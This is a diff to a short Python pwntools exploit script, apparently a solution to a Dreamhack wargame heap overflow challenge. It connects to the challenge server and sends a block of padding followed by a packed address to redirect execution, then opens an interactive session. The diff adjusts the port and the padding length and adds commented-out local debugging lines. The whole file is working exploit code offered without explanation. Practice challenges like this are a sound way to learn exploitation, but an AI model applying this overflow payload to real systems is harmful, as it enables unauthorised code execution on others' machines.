@@ -1,8 +1,10 @@
 from pwn import *
 
 context.update(log_level = 'debug')
-p = remote('host1.dreamhack.games', 8589)
+p = remote('host1.dreamhack.games', 8577)
+#p = process('basic_heap_overflow22')
 p.recvrepeat(1)
-p.sendline('a'*0x30 + p32(0x804867B))
+#raw_input('debug: ' + str(p.pid))
+p.sendline('a'*0x28 + p32(0x804867B))
 p.interactive()
 
